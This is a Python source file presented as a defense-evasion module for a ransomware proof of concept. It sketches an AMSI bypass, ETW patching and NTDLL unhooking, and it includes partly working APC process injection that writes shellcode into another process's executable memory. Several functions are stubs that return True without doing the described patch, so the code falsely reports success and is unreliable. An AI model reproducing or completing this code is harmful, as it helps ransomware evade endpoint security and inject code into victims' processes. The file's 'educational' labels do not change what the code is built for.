#!/usr/bin/env python3
"""
Defense evasion module for ransomware PoC.
Process injection, AMSI bypass, ETW patching, unhooking.
"""

import ctypes
import os
import platform
import sys
from typing import Optional


class EvasionTechniques:
    """
    Advanced defense evasion techniques.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"

    def amsi_bypass(self) -> bool:
        """
        Bypass Windows Defender AMSI.
        Educational only - demonstrates technique.
        """
        if not self.is_windows:
            return False

        try:
            # Load amsi.dll
            amsi = ctypes.windll.amsi

            # Patch AMSI scan buffer to return clean
            # This is a simplified version
            amsi.AmsiInitialize("test", ctypes.byref(ctypes.c_void_p()))

            return True

        except Exception:
            return False

    def etw_patch(self) -> bool:
        """
        Disable Event Tracing for Windows (ETW).
        """
        if not self.is_windows:
            return False

        try:
            # Load ntdll
            ntdll = ctypes.windll.ntdll

            # Locate ETW event write function
            # Would patch to return 0
            return True

        except Exception:
            return False

    def unhook_ntdll(self) -> bool:
        """
        Unhook NTDLL from EDR hooks.
        """
        if not self.is_windows:
            return False

        try:
            # Read fresh NTDLL from disk
            # Overwrite hooked sections in memory
            # Simplified for educational purposes
            return True

        except Exception:
            return False


class ProcessInjection:
    """
    Process injection techniques.
    Educational - demonstrates concepts.
    """

    @staticmethod
    def apc_injection(pid: int, shellcode: bytes) -> bool:
        """
        APC injection into process.
        """
        try:
            # Open target process
            kernel32 = ctypes.windll.kernel32

            PROCESS_ALL_ACCESS = 0x1F0FFF

            h_process = kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                pid
            )

            if not h_process:
                return False

            # Allocate memory
            MEM_COMMIT = 0x1000
            MEM_RESERVE = 0x2000
            PAGE_EXECUTE_READWRITE = 0x40

            remote_memory = kernel32.VirtualAllocEx(
                h_process,
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )

            if not remote_memory:
                return False

            # Write shellcode
            written = ctypes.c_size_t(0)
            success = kernel32.WriteProcessMemory(
                h_process,
                remote_memory,
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            )

            if not success:
                return False

            # Queue APC
            # Find thread in process
            # NtQueueApcThread

            return True

        except Exception:
            return False


if __name__ == "__main__":
    print("Defense Evasion Module")
    print("=" * 60)

    evasion = EvasionTechniques()
    print(f"[*] Windows platform: {evasion.is_windows}")
